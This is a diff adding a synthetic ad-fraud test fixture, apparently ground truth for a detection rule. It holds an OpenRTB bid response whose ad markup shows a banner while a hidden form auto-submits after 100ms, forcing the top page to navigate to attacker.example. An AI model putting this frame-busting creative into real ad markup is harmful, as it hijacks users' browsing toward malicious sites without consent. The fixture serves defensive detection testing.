@@ -1,0 +1,25 @@
+{
+  "_note": "Synthetic fraud BidResponse — form-based frame-bust. The adm renders a visible banner AND mounts a hidden <form target=\"_top\" action=\"...\"> that auto-submits 100ms after load (no user gesture). Probe hook 12.A (HTMLFormElement.prototype.submit) catches the call; engine emits behavior.malicious.frame_bust_form (ERROR). Sandbox itself blocks the actual top-frame navigation, but the intent is what we surface. Used as truth-ground for the form-bust rule during Phase 3.",
+  "id": "bid-response-frame-bust-form-001",
+  "cur": "USD",
+  "seatbid": [
+    {
+      "seat": "synthetic-bad-actor",
+      "bid": [
+        {
+          "id": "bid-frame-bust-form-001",
+          "impid": "1",
+          "price": 1.5,
+          "adid": "creative-frame-bust-form-001",
+          "adomain": ["bad-actor.example"],
+          "cid": "campaign-frame-bust-001",
+          "crid": "creative-frame-bust-form-001",
+          "w": 300,
+          "h": 250,
+          "cat": ["IAB1"],
+          "adm": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>banner</title><style>html,body{margin:0;padding:0;height:100%;font-family:sans-serif}.banner{width:300px;height:250px;background:linear-gradient(135deg,#3e63dd,#7c8cff);color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:600;text-align:center}form{display:none}</style></head><body><div class=\"banner\">Special offer<br>Click to learn more</div><form id=\"bust\" action=\"https://attacker.example/landing\" method=\"GET\" target=\"_top\"></form><script>setTimeout(function(){document.getElementById('bust').submit();},100);</script></body></html>"
+        }
+      ]
+    }
+  ]
+}
